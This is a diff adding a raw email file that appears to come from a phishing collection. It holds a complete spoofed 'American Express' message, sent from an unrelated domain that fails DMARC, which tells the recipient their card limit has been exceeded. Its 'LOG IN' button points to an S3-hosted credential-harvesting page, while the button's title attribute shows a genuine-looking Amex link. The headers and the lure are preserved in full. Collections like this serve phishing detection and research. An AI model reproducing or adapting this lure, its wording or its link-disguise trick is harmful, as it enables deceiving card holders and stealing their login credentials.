@@ -1,0 +1,200 @@
+Return-Path: amex@brainscutr.info
+Delivered-To: jose@monkey.org
+X-FDA: 82908420336.08.2C58337
+Received: from smtp91.iad3a.emailsrvr.com (smtp91.iad3a.emailsrvr.com
+ [173.203.187.91])	by imf27.b.hostedemail.com (Postfix) with ESMTP id
+ 4C7771A0007	for <jose@monkey.org>; Wed, 18 Dec 2024 15:12:14 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;	dkim=none;	spf=none
+ (imf27.b.hostedemail.com: domain of amex@brainscutr.info has no SPF policy
+ when checking 173.203.187.91) smtp.mailfrom=amex@brainscutr.info;	dmarc=fail
+ reason="No valid SPF, No valid DKIM" header.from=americanexpress.com
+ (policy=reject)
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1734534733;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	 references;
+ bh=/KDATKn7ePfnXDEJVjtGDyehLVuBv0Q1vwumKyORe1A=;
+	b=M3HEa1iuYJf9GIv3j8Knvo8YdghiFqJOulf4e1zbm4go3a0d44tS2Pq0e27L05hlI/CkBD
+	MMlxFRumo3lU/Q+8j3lcpSHAWoCOYx0s1IodA7m4B5QswyNSIct6wUHRfuyQ/VJ2nCj29A
+	//r3H08PmOkRZf+enq0Uf8vf/zQtW6E=
+ARC-Authentication-Results: i=1;	imf27.b.hostedemail.com;	dkim=none;	spf=none
+ (imf27.b.hostedemail.com: domain of amex@brainscutr.info has no SPF policy
+ when checking 173.203.187.91) smtp.mailfrom=amex@brainscutr.info;	dmarc=fail
+ reason="No valid SPF, No valid DKIM" header.from=americanexpress.com
+ (policy=reject)
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1734534733; a=rsa-sha256;
+	cv=none;
+	b=hb4hK7bglg/5VybeTwSudQJUiVSU2yPw5B6Kkj5ggYSJxHG/0RABKj0oJH0VZsd/SksNa5
+	4p7HWVJLY3xD71VrgynudIsdms23zMkShDX4mdGN5ED6EH6glPELt2M9Nj7puh86UhCJH/
+	7LCJA0XoNn1WaU/poD572O0YEw94vbY=
+Received: from app50.wa-webapps.iad3a (relay-webapps.rsapps.net
+ [172.27.255.140])	by smtp12.relay.iad3a.emailsrvr.com (SMTP Server) with
+ ESMTP id 578BD250E9;	Wed, 18 Dec 2024 10:12:41 -0500 (EST)
+Received: from brainscutr.info (localhost.localdomain [127.0.0.1])
+	by app50.wa-webapps.iad3a (Postfix) with ESMTP id A8194600C0;
+	Wed, 18 Dec 2024 10:12:39 -0500 (EST)
+Received: by app.rackspace.com    (Authenticated sender: amex@brainscutr.info,
+ from: americanexpress@welcome.americanexpress.com)     with HTTP; Wed, 18 Dec
+ 2024 10:12:39 -0500 (EST)
+X-Auth-ID: amex@brainscutr.info
+Date: Wed, 18 Dec 2024 10:12:39 -0500 (EST)
+Subject: Your credit limit has been exceeded
+From: "American Express" <americanexpress@welcome.americanexpress.com>
+To: amex@americaexpress.com
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="----=_20241218101240000000_86472"
+Importance: Normal
+X-Priority: 3 (Normal)
+X-Type: html
+X-Client-IP: 197.242.103.161
+Message-ID: <1734534759.684616286@app.rackspace.com>
+X-Mailer: webmail/19.0.25-RC
+X-Classification-ID: 4cf309f4-f73d-497f-aced-41f1838a66b2-1-1
+X-Rspam-User: 
+X-Rspamd-Server: rspam12
+X-Rspamd-Queue-Id: 4C7771A0007
+X-Stat-Signature: i1miz1i4i1t9hwreyrtn5wa3wp1u48zj
+X-Rspamd-Pre-Result: action=add header;
+	module=dmarc;
+	Action set by DMARC
+X-Spam-Status: Yes, score=7.45
+X-Rspam: Yes
+X-HE-Tag: 1734534734-833358
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/lrNWQTyFfzpBQg1SXTPJ6XiUt54VIxRQQMDy9loPF6vh?=
+ =?utf-8?q?w30rakRUqS/q0UkJioIjb5WTi79cYQXVYCNY+b0j7kfoAZZItwMNGHDL0ovT7Q7gK?=
+ =?utf-8?q?MAgpOsP7PnCoTi6opB5XfOdl7vezfIJpFG7DTncEhxB7K478R7LiFg2SLhnUDUCeb?=
+ =?utf-8?q?yHgCg1VirBNWdDBouleMSZY9PwSEQ8MtwmbjkvcmEigKN5y6Mbdnzc0R7kmZfYPpY?=
+ =?utf-8?q?03yYjOoVYAvgz48wghT6SJhJeZFlPcq6TKmYDXxDFRimIVHjuhTLx3AD6GW8WX3OL?=
+ =?utf-8?q?T0PdtBvqIhWP8RuraKNBaKvnyCV4OpEPGtqKK8Tf/5/UCqSUhHKbceSf+dp1Y3ID0?=
+ =?utf-8?q?rKIJ+9ulH8++o5VdfYjmIEYBMAj0IRgNUwlkjR/bKTS6xWxVkfq6QcYfl+8RduKVq?=
+ =?utf-8?q?RRoIib9GeJG8ScvVF1Ij5fd++5WNp/FPfZeN2U6B6rlgXzEYOioNSIA354OXn9Pqz?=
+ =?utf-8?q?nEU/8bqbHCDH8b2U5FFC0KvPHj6gFm1Ej/dHtqvu/leQrEw+9EkfztwabyZg+AN42?=
+ =?utf-8?q?cuEP9/qp5p0gZ4eb3wy+MkuYZ9686FxD1Dhcua7Tfo/PD8dHShmoPdaIgymzs0+87?=
+ =?utf-8?q?WlAAbkQnU/4jGEL4+42t7CaaSTDAWGrbEA9vcQFgRfWc69eildZbOTroPXdyAG/B8?=
+ =?utf-8?q?Lxe2EOZH8Fgf8twKrHfUpdGQEr9nH1lE4HSOOx9GdS2Cnqvg/c+cWb4PYXZnwbir7?=
+ =?utf-8?q?U20l4efL4z/87cwDm+zM3G8fURAz6e8a4OtvtMXfXfw2dRmPTEFgSn5jM4kD6fRfm?=
+ =?utf-8?q?TW56Nxe0Fdsmrk5KIql53/eps5fHBUKkOKM2UHPLa/jfXlWeZS2KQ7IYAJxHDx+qB?=
+ =?utf-8?q?o5JySZHA7TMLjFB6zMh0tqnJ1wP8VWC3G9gDj3LTLlIeW8LS47OzzZPsJ5ScuHeAh?=
+ =?utf-8?q?yFr0CPUr/D1SNHuGD7a0XO_og9jwevRuMcjr2Hy11IiZWjScEP4PQ7SB2ol8O8Nqx?=
+ =?utf-8?q?1UMJlmn7M6DjWNDDJiYXjUW2zrxa8lEMi/1cOCnKxOf3MANXkW46uAvBBYdPrbAT6?=
+ =?utf-8?q?bAl8tKRCfpQkU/NtwA0RSFM2394+iu3pKzHG4f/075dTsoTE0iQx871hld/9CFi8Y?=
+ =?utf-8?q?zd4bZXWDTx+cq4JzY62YWWr8dzNAUcyGmmAOvcHh9allvZAc16BCCCvM0mI0X9Ldy?=
+ =?utf-8?q?7lpmXr+eFO24AWlJdiBUtxJr0lr/QiD95NoS/OS1OX7v/AoKhjBabIrAuDd0f1pg9?=
+ =?utf-8?q?mUP1MViH27ynKdHZzZNQx713SHhKo1tVqdgTmCmLY1K5fidcKVKVegBl6Rc5XAuyG?=
+ =?utf-8?q?uovQP7gqBGOk1CshYpv+1dZNwsBVBzw5vOg42EMUr2oHl79fOyHViKOeIVekaWCzL?=
+ =?utf-8?q?EwX12t8U/T6pPDFF0QkjofSYujwHTVwAGiV5SAzNOg01kc+HsXE2RzEfY+YCX0Cdi?=
+ =?utf-8?q?jxw6cViBWx2pzGAQfkcnlTbaT6NT69op9wYxhBt36QPk0Zz9cu91FYde+0zeYgBMF?=
+ =?utf-8?q?mAs5AOvoQTXujCaxUlICE8KMZDdf2EfKIUmMRbwFikrMa0Q7LCvglJfe98WEsYJRS?=
+ =?utf-8?q?I7aLtduBjNPd6K/ixJzD62rTwqZsBxRZdZ31Od0ukH5jOkMV7WjTLslr1fc0XUAfJ?=
+ =?utf-8?q?fCCPN5QdfOulaxmp80NYKy/Cpg1cZvbVLFmTs8Dz1e3CAhIzumaHCmpiym6rCtYls?=
+ =?utf-8?q?Tnpw1Q=3D=3D?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 396
+
+------=_20241218101240000000_86472
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+=0A=0A=0A=0A=0A=0A=0A=0A =0A=0A=0A=0ACard over limit=0A=0A=0A=0AYou've exce=
+eded your card limit=0A=0A=0A=0AReview your credit file=0A =0A[ LOG IN ]( h=
+ttps://webmailpaperlanternmail.s3.eu-north-1.amazonaws.com/American.html )=
+=0A=0A=0A=0A=0AYour credit file has been updated.
+------=_20241218101240000000_86472
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+<font face=3D"arial" size=3D"2"><table class=3D"gmail-x_wrapper" style=3D"f=
+ont-style: normal; font-variant-ligatures: normal; font-variant-caps: norma=
+l; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-va=
+riant-alternates: inherit; font-variant-position: inherit; font-weight: 400=
+; font-stretch: inherit; font-size: 15px; line-height: inherit; font-optica=
+l-sizing: inherit; font-size-adjust: inherit; font-kerning: inherit; font-f=
+eature-settings: inherit; font-variation-settings: inherit; border-collapse=
+: collapse; color: #242424; letter-spacing: normal; text-transform: none; w=
+ord-spacing: 0px; white-space: normal; text-decoration-thickness: initial; =
+text-decoration-style: initial; text-decoration-color: initial; table-layou=
+t: fixed;" align=3D"center" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
+" width=3D"684">=0A<tbody>=0A<tr>=0A<td class=3D"gmail-x_bg_2" style=3D"whi=
+te-space: normal; border-collapse: collapse; background-image: url('http://=
+click1.mycredit-guide.americanexpress.com/nfkrpjgtfthnbkwmntpjfnkzzcnhctfyt=
+fjdkjbnpjfyk~.gif'); background-repeat: repeat;" align=3D"left" width=3D"68=
+4" valign=3D"top" bgcolor=3D"#00175A">=0A<table style=3D"font: inherit; bor=
+der-collapse: collapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" w=
+idth=3D"100%">=0A<tbody>=0A<tr>=0A<td style=3D"white-space: normal; border-=
+collapse: collapse; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padd=
+ing: 8px 16px;" height=3D"60"><img src=3D"https://cdaas.americanexpress.com=
+/akamai/axp/comms/logos/logo.png" alt=3D"American Express Logo" /></td>=0A<=
+/tr>=0A<tr>=0A<td class=3D"gmail-x_bg" style=3D"white-space: normal; border=
+-collapse: collapse; background-image: url('http://click1.mycredit-guide.am=
+ericanexpress.com/tbcmcjsbhbfktpwrkbcjhkpggdkfdbhzbhjvpjtkcjlcw~.gif'); bac=
+kground-size: cover; background-position: right top; background-repeat: no-=
+repeat;" align=3D"left" width=3D"684" height=3D"262" valign=3D"top">=0A<div=
+ style=3D"border: 0px; font: inherit; margin: 0px; padding: 0px; vertical-a=
+lign: baseline; color: inherit;">=0A<table class=3D"gmail-x_wrapper" style=
+=3D"font: inherit; border-collapse: collapse;" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0" width=3D"684">=0A<tbody>=0A<tr>=0A<td class=3D"gmail-x=
+_h20" style=3D"white-space: normal; border-collapse: collapse; font-size: 1=
+px; line-height: 1px;" height=3D"42">&nbsp;</td>=0A</tr>=0A<tr>=0A<td class=
+=3D"gmail-x_screen" style=3D"white-space: normal; border-collapse: collapse=
+;">=0A<table class=3D"gmail-x_tbResp" style=3D"font: inherit; border-collap=
+se: collapse;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"70=
+%">=0A<tbody>=0A<tr>=0A<td class=3D"gmail-x_difference" style=3D"white-spac=
+e: normal; border-collapse: collapse; color: #ffffff; font-size: 16px; font=
+-family: Helvetica, Nueue, Arial, sans-serif; line-height: 24px; font-weigh=
+t: 350; padding: 5px 16px 4px;" align=3D"left" width=3D"100%">=0A<p class=
+=3D"gmail-x_keep-white" style=3D"margin:0;padding:0;margin: 0px; padding: 0=
+px; max-width: 400px;">Card over limit</p>=0A</td>=0A</tr>=0A</tbody>=0A</t=
+able>=0A</td>=0A</tr>=0A<tr>=0A<td class=3D"gmail-x_screen" style=3D"white-=
+space: normal; border-collapse: collapse;">=0A<table class=3D"gmail-x_tbRes=
+p" style=3D"font: inherit; border-collapse: collapse;" border=3D"0" cellspa=
+cing=3D"0" cellpadding=3D"0" width=3D"70%">=0A<tbody>=0A<tr>=0A<td class=3D=
+"gmail-x_difference" style=3D"white-space: normal; border-collapse: collaps=
+e; color: #ffffff; font-size: 30px; font-family: Helvetica, Nueue, Arial, s=
+ans-serif; line-height: 38px; font-weight: 350; padding: 0px 16px 4px;" ali=
+gn=3D"left" width=3D"100%">=0A<p class=3D"gmail-x_keep-white" style=3D"marg=
+in:0;padding:0;margin: 0px; padding: 0px; max-width: 400px;"><strong>You've=
+ exceeded your card limit</strong></p>=0A</td>=0A</tr>=0A</tbody>=0A</table=
+>=0A</td>=0A</tr>=0A<tr>=0A<td class=3D"gmail-x_screen" style=3D"white-spac=
+e: normal; border-collapse: collapse;">=0A<table class=3D"gmail-x_tbResp" s=
+tyle=3D"font: inherit; border-collapse: collapse;" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0" width=3D"70%">=0A<tbody>=0A<tr>=0A<td class=3D"gma=
+il-x_difference" style=3D"white-space: normal; border-collapse: collapse; c=
+olor: #ffffff; font-size: 16px; font-family: Helvetica, Nueue, Arial, sans-=
+serif; line-height: 24px; font-weight: 350; padding: 0px 16px 4px;" align=
+=3D"left" width=3D"100%">=0A<p class=3D"gmail-x_keep-white" style=3D"margin=
+:0;padding:0;margin: 0px; padding: 0px; max-width: 400px;">Review your cred=
+it file</p>=0A</td>=0A</tr>=0A</tbody>=0A</table>=0A</td>=0A</tr>=0A<tr>=0A=
+<td style=3D"white-space: normal; border-collapse: collapse; font-size: 1px=
+; line-height: 1px;" height=3D"20">&nbsp;</td>=0A</tr>=0A<tr>=0A<td style=
+=3D"white-space: normal; border-collapse: collapse; padding: 0px 16px;"><a =
+class=3D"gmail-x_btn-resp" style=3D"border: 0px; font-style: normal; font-v=
+ariant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; =
+line-height: 24px; font-family: Helvetica, Neue; font-optical-sizing: inher=
+it; font-size-adjust: inherit; font-kerning: inherit; font-feature-settings=
+: inherit; font-variation-settings: inherit; margin: 24px 0px 40px; padding=
+: 13px 0px; vertical-align: baseline; border-collapse: collapse; color: #ff=
+ffff; display: block; background-image: initial; background-position: initi=
+al; background-size: initial; background-repeat: initial; background-attach=
+ment: initial; background-origin: initial; background-clip: initial; backgr=
+ound-color: #006fcf; border-radius: 4px; text-align: center; width: 180px; =
+text-decoration: none;" title=3D"http://m.amex/rMZHyx?extlink=3Den-us-mcg-e=
+mail-alert-sso-overlimitA-h-login" rel=3D"noopener noreferrer" href=3D"http=
+s://webmailpaperlanternmail.s3.eu-north-1.amazonaws.com/American.html" targ=
+et=3D"_blank">LOG IN</a></td>=0A</tr>=0A</tbody>=0A</table>=0A</div>=0A</td=
+>=0A</tr>=0A</tbody>=0A</table>=0A</td>=0A</tr>=0A<tr>=0A<td style=3D"white=
+-space: normal; border-collapse: collapse; padding: 24px 16px;" bgcolor=3D"=
+#ffffff">=0A<table style=3D"font: inherit; border-collapse: collapse;" bord=
+er=3D"0" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%">=0A<tbody>=0A<t=
+r>=0A<td id=3D"gmail-x_salutation" style=3D"white-space: normal; border-col=
+lapse: collapse; color: #000000; font-size: 16px; font-family: Helvetica, N=
+eue, Arial, sans-serif; line-height: 24px; font-style: normal; font-weight:=
+ 400; padding-bottom: 20px;"><br /><br />Your credit file has been updated.=
+</td>=0A</tr>=0A</tbody>=0A</table>=0A</td>=0A</tr>=0A</tbody>=0A</table></=
+font>
+------=_20241218101240000000_86472--
+
+
